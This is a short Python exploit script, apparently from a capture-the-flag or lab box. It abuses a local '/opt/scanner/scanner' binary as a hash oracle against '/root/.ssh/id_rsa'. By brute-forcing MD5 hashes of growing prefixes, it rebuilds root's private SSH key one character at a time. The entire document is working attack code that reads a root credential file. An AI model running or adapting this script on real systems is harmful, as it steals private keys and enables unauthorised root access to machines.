import hashlib
import os
import string

def brute(id_rsa, hash):
    for c in string.printable:
        if hashlib.md5((id_rsa + c).encode()).hexdigest() == hash: return c


id_rsa = "-----BEGIN OPENSSH PRIVATE KEY-----"
i = len(id_rsa)
print(id_rsa)

while True:
    i += 1
    result = os.popen(f"/opt/scanner/scanner -l {i} -s 123456 -c /root/.ssh/id_rsa -p").read()
    arr = result.split()
    hash = arr[-1]
    chr = brute(id_rsa, hash)
    id_rsa += chr
    
    print(chr, end="")
    
    if i == 3000: break
